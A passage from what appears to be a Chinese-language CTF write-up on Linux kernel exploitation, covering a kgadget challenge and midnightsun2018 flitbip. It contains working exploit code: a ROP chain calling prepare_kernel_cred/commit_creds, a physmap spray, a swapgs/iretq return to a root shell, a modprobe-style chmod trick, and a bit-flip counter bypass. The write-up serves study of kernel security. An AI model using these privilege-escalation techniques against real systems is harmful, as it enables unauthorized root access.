        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"  "</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">row_size</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">+</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">hex_num</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">text</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">],</span> <span class="mi">2</span><span class="p">);</span>
                <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">for</span> <span class="p">(;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">row_size</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"   "</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"  |"</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>

        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">row_size</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">+</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">((</span><span class="n">text</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">])</span> <span class="o">&gt;=</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="n">text</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">&lt;</span><span class="mi">127</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">text</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">],</span> <span class="mi">1</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"."</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"|"</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>

        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>


</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="exploit-4"><span class="me-2">exploit</span><a href="#exploit-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202115619-t973ndh.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202115619-t973ndh.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202115647-zrmop6b.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202115647-zrmop6b.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>prepare_kernel_cred</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202115722-3yq7qap.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202115722-3yq7qap.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>swapgs_restore_regs_and_return_to_usermode</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202120420-2m2y94e.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202120420-2m2y94e.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>提权</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202120526-ilmzxov.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241202120526-ilmzxov.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>exploit</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">save_status</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_sp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">get_root_shell</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">uid</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
    <span class="c1">//chmod("/flag",0777);</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="n">shell_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_root_shell</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"xor rdi, rdi;"</span>
        <span class="s">"mov rcx, prepare_kernel_cred;"</span>
        <span class="s">"call rcx;"</span>
        <span class="s">"mov rcx, commit_creds;"</span>
        <span class="s">"call rcx;"</span>
        <span class="c1">// swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp</span>
    <span class="p">);</span>
    <span class="c1">// restore_flags</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"push user_ss;"</span>
        <span class="s">"push user_sp;"</span>
        <span class="s">"push user_rflags;"</span>
        <span class="s">"push user_cs;"</span>
        <span class="s">"push shell_addr;"</span>
        <span class="s">"swapgs;"</span>
        <span class="s">"iretq;"</span>
    <span class="p">);</span>
<span class="p">}</span><span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">modprobe_rce</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/chmod 777 /flag</span><span class="se">\n</span><span class="s">' &gt; /tmp/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /tmp/e2"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/e2"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/tmp/e2"</span><span class="p">);</span>      <span class="c1">// sh: /tmp/e2: Permission denied</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/tmp/e2"</span><span class="p">);</span>      <span class="c1">// ./tmp/e2: line 1: : not found</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /flag"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /flag"</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">size_t</span> <span class="n">pop_rsp_ret</span>  <span class="o">=</span> <span class="mh">0xffffffff811483d0</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">add_rsp_0xC0</span> <span class="o">=</span> <span class="mh">0xffffffff81488561</span><span class="p">;</span> <span class="c1">// cat gadget.txt |grep "add rsp, 0xa8", pop x N;ret</span>
<span class="kt">size_t</span> <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0xffffffff8108c6f0</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0xffffffff810c9540</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xffffffff810c92e0</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">=</span> <span class="mh">0xffffffff81c00fb0</span> <span class="o">+</span> <span class="mi">27</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">physmap_spary</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="kt">size_t</span><span class="o">*</span> <span class="n">rop</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">15000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="n">rop</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_rsp_0xC0</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
                <span class="c1">//rop[j++] = mov_rdi_rax; prepare_kernel_cred  ret 后 rax 和 rdi 是一样的所以没必要 mov 了</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">shell_addr</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>
    <span class="n">save_status</span><span class="p">();</span>
    <span class="kt">char</span> <span class="n">procn</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/dev/kgadget"</span><span class="p">;</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">procn</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>

    <span class="n">physmap_spary</span><span class="p">();</span> 
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">"mov r15, 0x1111;"</span>
        <span class="s">"mov r14, 0x2222;"</span>
        <span class="s">"mov r13, 0x3333;"</span>
        <span class="s">"mov r12, 0x4444;"</span>
        <span class="s">"mov r11, 0x5555;"</span>
        <span class="s">"mov r10, 0x6666;"</span>
        <span class="s">"mov r9,  pop_rsp_ret;"</span>
        <span class="s">"mov r8,  0xffff888000000000 + 0x6000000 + 8;"</span>
        <span class="s">"mov rcx, 0x9999;"</span>
        <span class="s">"mov rbx, 0xaaaa;"</span>
        <span class="s">"mov rdx, 0xffff888000000000+0x6000000;"</span>
        <span class="s">"mov rsi, 0x1BF52;"</span>
        <span class="s">"mov rdi, fd;"</span>
        <span class="s">"mov rax, 0x10;"</span>
        <span class="s">"syscall;"</span>
        <span class="p">);</span>


<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">env</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>





</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="midnightsun2018-flitbip白给的漏洞"><span class="me-2">midnightsun2018-flitbip(白给的漏洞)</span><a href="#midnightsun2018-flitbip白给的漏洞" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<h3 id="题目分析"><span class="me-2">题目分析</span><a href="#题目分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>init 关闭了地址随机化</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
qemu-system-x86_64 <span class="se">\</span>
    <span class="nt">-m</span> 128M <span class="se">\</span>
    <span class="nt">-kernel</span> ./bzImage <span class="se">\</span>
    <span class="nt">-initrd</span> ./initrd <span class="se">\</span>
    <span class="nt">-nographic</span> <span class="se">\</span>
    <span class="nt">-monitor</span> /dev/null <span class="se">\</span>
    <span class="nt">-append</span> <span class="s2">"nokaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet"</span> 2&gt;/dev/null

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>添加了新的 syscall</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/sched.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/syscalls.h&gt;</span><span class="cp">
</span>
<span class="cp">#define MAXFLIT 1
</span>
<span class="cp">#ifndef __NR_FLITBIP
#define FLITBIP 333
#endif
</span>
<span class="kt">long</span> <span class="n">flit_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">EXPORT_SYMBOL</span><span class="p">(</span><span class="n">flit_count</span><span class="p">);</span>

<span class="n">SYSCALL_DEFINE2</span><span class="p">(</span><span class="n">flitbip</span><span class="p">,</span> <span class="kt">long</span> <span class="o">*</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">long</span><span class="p">,</span> <span class="n">bit</span><span class="p">)</span>
<span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">flit_count</span> <span class="o">&gt;=</span> <span class="n">MAXFLIT</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"flitbip: sorry :/</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="o">*</span><span class="n">addr</span> <span class="o">^=</span> <span class="p">(</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">bit</span><span class="p">));</span>
        <span class="n">flit_count</span><span class="o">++</span><span class="p">;</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<p>表面上看这个syscall 只能用一次， 由于 flit_count 是一个 有符号数，如果 <code class="language-plaintext highlighter-rouge">flit_count</code>​ 是一个负数 也会符合小于0的条件从而绕过“只能使用一次的限制”，关闭了地址刷 <code class="language-plaintext highlighter-rouge">kaslr</code>​  <code class="language-plaintext highlighter-rouge">flit_count</code>​ 地址就是已知的了，所以说第一次修改 <code class="language-plaintext highlighter-rouge">flit_count</code>​ 为一个负数即可多次使用 <code class="language-plaintext highlighter-rouge">FLITBIP</code>​</p>

<p>‍</p>

<h3 id="漏洞利用过程"><span class="me-2">漏洞利用过程</span><a href="#漏洞利用过程" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>
<span class="kt">int</span> <span class="nf">flitbip</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">int</span> <span class="n">bit</span><span class="p">){</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">333</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">bit</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>

    <span class="kt">size_t</span> <span class="n">test_addr</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f70</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">flit_count</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f78</span><span class="p">;</span>
    <span class="n">flitbip</span><span class="p">(</span><span class="n">flit_count</span> <span class="p">,</span> <span class="mi">63</span><span class="p">);</span>
    <span class="c1">// &gt;&gt;&gt; hex(1 &lt;&lt; 63)</span>
    <span class="c1">// 0x8000000000000000</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x40</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">flitbip</span><span class="p">(</span><span class="n">test_addr</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213123944-lq18pgp.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213123944-lq18pgp.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>没有 <code class="language-plaintext highlighter-rouge">/sbin/modprobe</code>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213124018-6pgqqgk.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213124018-6pgqqgk.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>劫持 <code class="language-plaintext highlighter-rouge">fops</code>​</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="k">static</span> <span class="k">struct</span> <span class="n">tty_ldisc_ops</span> <span class="n">n_tty_ops</span> <span class="o">=</span> <span class="p">{</span>
	<span class="p">.</span><span class="n">magic</span>           <span class="o">=</span> <span class="n">TTY_LDISC_MAGIC</span><span class="p">,</span>
	<span class="p">.</span><span class="n">name</span>            <span class="o">=</span> <span class="s">"n_tty"</span><span class="p">,</span>
	<span class="p">.</span><span class="n">open</span>            <span class="o">=</span> <span class="n">n_tty_open</span><span class="p">,</span>
	<span class="p">.</span><span class="n">close</span>           <span class="o">=</span> <span class="n">n_tty_close</span><span class="p">,</span>
	<span class="p">.</span><span class="n">flush_buffer</span>    <span class="o">=</span> <span class="n">n_tty_flush_buffer</span><span class="p">,</span>
	<span class="p">.</span><span class="n">read</span>            <span class="o">=</span> <span class="n">n_tty_read</span><span class="p">,</span>
	<span class="p">.</span><span class="n">write</span>           <span class="o">=</span> <span class="n">n_tty_write</span><span class="p">,</span>
	<span class="p">.</span><span class="n">ioctl</span>           <span class="o">=</span> <span class="n">n_tty_ioctl</span><span class="p">,</span>
	<span class="p">.</span><span class="n">set_termios</span>     <span class="o">=</span> <span class="n">n_tty_set_termios</span><span class="p">,</span>
	<span class="p">.</span><span class="n">poll</span>            <span class="o">=</span> <span class="n">n_tty_poll</span><span class="p">,</span>
	<span class="p">.</span><span class="n">receive_buf</span>     <span class="o">=</span> <span class="n">n_tty_receive_buf</span><span class="p">,</span>
	<span class="p">.</span><span class="n">write_wakeup</span>    <span class="o">=</span> <span class="n">n_tty_write_wakeup</span><span class="p">,</span>
	<span class="p">.</span><span class="n">receive_buf2</span>	 <span class="o">=</span> <span class="n">n_tty_receive_buf2</span><span class="p">,</span>
<span class="p">};</span>
<span class="cp"># 初期化
</span><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">pps_tty_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">err</span><span class="p">;</span>

	<span class="cm">/* Inherit the N_TTY's ops */</span>
	<span class="n">n_tty_inherit_ops</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pps_ldisc_ops</span><span class="p">);</span>
<span class="p">(</span><span class="n">snipped</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>跟一下</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213125352-jh98b19.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213125352-jh98b19.png" alt="image" loading="lazy"></a>​</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="o">*</span><span class="n">RAX</span>  <span class="mh">0xffffffffffffffff</span>
<span class="o">*</span><span class="n">RBX</span>  <span class="mh">0xffffc9000007ff58</span> <span class="err">◂—</span> <span class="mi">0</span>
<span class="o">*</span><span class="n">RCX</span>  <span class="mi">0</span>
<span class="o">*</span><span class="n">RDX</span>  <span class="mi">0</span>
 <span class="n">RDI</span>  <span class="mi">0</span>
<span class="o">*</span><span class="n">RSI</span>  <span class="mh">0xffffc9000007ff58</span> <span class="err">◂—</span> <span class="mi">0</span>
 <span class="n">R8</span>   <span class="mi">0</span>
<span class="o">*</span><span class="n">R9</span>   <span class="mi">0</span>
 <span class="n">R10</span>  <span class="mi">0</span>
<span class="o">*</span><span class="n">R11</span>  <span class="mi">0</span>
 <span class="n">R12</span>  <span class="mi">0</span>
 <span class="n">R13</span>  <span class="mi">0</span>
 <span class="n">R14</span>  <span class="mi">0</span>
 <span class="n">R15</span>  <span class="mi">0</span>
<span class="o">*</span><span class="n">RBP</span>  <span class="mi">0</span>
<span class="o">*</span><span class="n">RSP</span>  <span class="mh">0xffffc9000007ff40</span> <span class="err">◂—</span> <span class="mi">0</span>
<span class="o">*</span><span class="n">RIP</span>  <span class="mh">0xffffffff81000be5</span> <span class="p">(</span><span class="n">do_syscall_64</span><span class="o">+</span><span class="mi">105</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span><span class="o">*</span><span class="mi">8</span> <span class="o">-</span> <span class="mh">0x7e9ffee0</span><span class="p">]</span>
<span class="err">───────────────────────────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">DISASM</span> <span class="o">/</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span> <span class="o">/</span> <span class="n">set</span> <span class="n">emulate</span> <span class="n">on</span> <span class="p">]</span><span class="err">────────────────────────────────────────────────────────────────────────────</span>
